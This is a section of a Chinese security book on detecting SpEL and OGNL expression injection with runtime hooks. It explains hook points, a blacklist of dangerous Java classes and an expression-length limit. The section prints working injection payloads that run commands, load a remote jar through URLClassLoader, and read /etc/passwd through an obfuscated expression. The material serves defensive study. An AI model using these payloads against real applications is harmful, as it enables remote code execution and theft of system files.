## 10.4 Hook点与检测算法

### 10.4.1 Hook点的选择

+ SPEL表达式注入

选择类org.springframework.expression.common.TemplateAwareExpressionParser
的`parseExpression`方法。
该方法的源码如下，通过前面一节的分析，该方法能够获取需要执行的原始表达式。
![图10-23 Node接口的uml](../../.vuepress/public/images/book/expression/img/Xnip2024-04-24_22-42-34.jpg)

从源码分析可以知道SPEL表达式的执行分为2步：第一步是查找类的Class对象，即调用
org.springframework.expression.spel.support.StandardTypeLocator的findType方法，

![图10-23 Node接口的uml](../../.vuepress/public/images/book/expression/img/Xnip2024-04-25_08-27-26.jpg)

第二步是反射调用方法，表达式中方法的执行最终都在org.springframework.expression.spel.support.ReflectiveMethodExecutor类的execute方法完成，
其源码如下：

![图10-23 Node接口的uml](../../.vuepress/public/images/book/expression/img/Xnip2024-04-25_08-31-24.jpg)


对于OGNL表达式注入，选择类ognl.OgnlParser的`topLevelExpression`方法，该方法的源码如下：


![截屏2024-04-05 下午6.03.16.png](img_9.png)

### 10.4.2 表达式注入与检测算法

由于OGNL与SPEL表达式除了Hook方法不一样，检测算法几乎一样，这里以SpEL表达式的检测算法为例子说明。

### 10.4.2.1 正常与恶意表达式举例

先来看下正常的业务使用的表达式：
```java

```

常见的具备攻击能力的表达式写法如下：
```java
// 使用java.lang.ProcessBuilder执行命令
new java.lang.ProcessBuilder(new String[]{"open","/System/Applications/Calculator.app"}).start()
// 使用ProcessBuilder执行命令
new ProcessBuilder(new String[]{"open","/System/Applications/Calculator.app"}).start()        
// 使用java.lang.Runtime执行命令
T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")
// 使用Runtime执行命令
T(Runtime).getRuntime().exec(new String[]{"open","/System/Applications/Calculator.app"})
// nashorn 引擎
new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("s=[2];s[0]='open';s[1]='/System/Applications/Calculator.app';java.lang.Runtime.getRuntime().exec(s);")
// javascript 引擎
new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("s=[2];s[0]='open';s[1]='/System/Applications/Calculator.app';java.lang.Runtime.getRuntime().exec(s);")
// 类加载
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8999/Exp.jar")}).loadClass("Exp").getConstructors()[0].newInstance("127.0.0.1:2333")        
// 反射 java.lang.Runtime
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")
// 反射 java.lang.ProcessBuilder
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.ProcessBuilder").getConstructors()[1].newInstance(new String[]{"open","/System/Applications/Calculator.app"}).start()
```

### 10.4.2.2 类与方法黑名单

检测表达式中是否存在指定的类，这些类能够执行命令、脚本或者读取文件等，常见的黑名单如下：
```java
java.lang.Runtime
java.lang.ProcessBuilder
java.lang.UNIXProcess
java.lang.ProcessImpl
java.lang.Classloader
java.lang.Class
java.lang.Thread
java.lang.ThreadGroup
java.lang.System
java.net.URL
java.net.URLClassLoader
javax.naming.InitialContext
javax.script.ScriptEngineManager
org.springframework.cglib.core.ReflectUtils
// 。。。
```


### 10.4.2.3 表达式最大长度限制

上面列的攻击方式还有其他的变种，如果仅限上面的黑名单类，很容易被绕过。
某个命令执行回显的Poc如下，显然其长度超过了正常表达式的长度。
一般应用的表达式不会太长，因此可以对表达式的长度做一个限制，例如OpenRasp中采用了这个算法。
如SPEL表达式字符串的长度一般在30～200，超过了最大的长度可以记录日志，方便离线分析。
```java
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character)
        .toString(99)
        .concat(T(java.lang.Character).toString(97))
        .concat(T(java.lang.Character).toString(116))
        .concat(T(java.lang.Character).toString(32))
        .concat(T(java.lang.Character).toString(47))
        .concat(T(java.lang.Character).toString(101))
        .concat(T(java.lang.Character).toString(116))
        .concat(T(java.lang.Character).toString(99))
        .concat(T(java.lang.Character).toString(47))
        .concat(T(java.lang.Character).toString(112))
        .concat(T(java.lang.Character).toString(97))
        .concat(T(java.lang.Character).toString(115))
        .concat(T(java.lang.Character).toString(115))
        .concat(T(java.lang.Character).toString(119))
        .concat(T(java.lang.Character).toString(100)))
        .getInputStream())
```
这种方式容易误报，特殊的业务场景会用到较长的表达式，而且表达式的长度需要收集业务特征来确定，运营成本较高。

参考：https://xz.aliyun.com/t/9245?time__1311=n4%2BxuDgD9DyDRGCDCD0DBMb7evwoa4ECDfrD&alichlgref=https%3A%2F%2Fbaidu.com%2F